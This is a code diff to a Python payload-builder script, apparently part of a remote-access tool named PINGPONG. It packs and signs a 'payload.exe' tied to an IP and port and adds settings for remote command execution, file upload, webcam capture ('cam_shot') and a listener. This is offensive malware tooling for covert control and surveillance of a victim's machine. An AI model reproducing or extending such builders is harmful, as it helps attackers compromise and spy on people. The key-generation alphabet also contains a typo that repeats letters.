@@ -9,8 +9,15 @@ from sys import path
 from random import randint
 install_path = path[4]
 path.append("..")
-import main
-#随机生成密钥
+import main, config
+config_list = ['cmd', 'upload', 'cam_shot', 'priv_vbp_listen']
+#加载默认设置
+def load_config(config_list):
+    local_var = globals()
+    for con in config_list:
+        data = main.get_value(con)
+        local_var[f'{con}'] = data
+#随机生成密钥		
 def generate_random_str(randomlength=16):
 	random_str =''
 	base_str ='ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
@@ -20,6 +27,9 @@ def generate_random_str(randomlength=16):
 	return random_str
 #打包
 def pack(payload, ip, port, printf, upx_command):
+	main.print_normal("payload>[*]Loading settings......")
+	main.print_normal('payload>[*]Loading Done')
+	load_config(config_list)
 	key = generate_random_str(randomlength=16)
 	main.print_normal(f"The key is: {key}")
 	current_path = abspath(__file__)
@@ -91,4 +101,14 @@ if __name__ == '__main__':
 	rename(f"{f_father_path}/PINGPONG_payload_sign_twice.exe", f"{f_father_path}/payload.exe")
 	if printf:
 		main.print_good(f"payload>[+]Done Successfully, the payload is in {f_father_path}\payload.exe")
+		main.print_normal("payload>[*]Printing out all the usage of your payload")
+		main.print_normal(f"""payload>[*]
+	--------------------------usage--------------------------
+		
+		cmd: {cmd}
+		upload: {upload}
+		cam_shot: {cam_shot}
+		priv_vbp_listen: {priv_vbp_listen}
+		
+		""")
 
